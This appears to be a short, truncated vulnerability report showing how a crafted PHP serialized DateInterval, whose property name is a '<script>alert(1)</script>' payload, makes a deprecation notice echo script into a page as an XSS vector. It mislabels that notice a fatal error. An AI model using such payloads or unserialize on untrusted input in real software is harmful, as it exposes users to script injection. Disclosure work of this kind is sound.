```php
<?php

$interval = new DateInterval("P7D");
$strser = serialize($interval);

print($strser);

unserialize('O:12:"DateInterval":10:{s:1:"y";i:0;s:1:"m";i:0;s:1:"d";i:7;s:1:"h";i:0;s:1:"i";i:0;s:1:"s";i:0;s:1:"f";d:0;s:6:"invert";i:0;s:4:"days";b:0;s:25:"<script>alert(1)</script>";b:0;}');

php>
```

This will produce a fatal error that prints to the output:

`Deprecated: Creation of dynamic property DateInterval::$<script>alert(1)</script> is deprecated in /home/user/scripts/code.php on line 8`

This is echoed back as part of the response's body, being thus a surface for XSS.

The error is produced due to the fact that the **NAME** of the field is being changed, an the s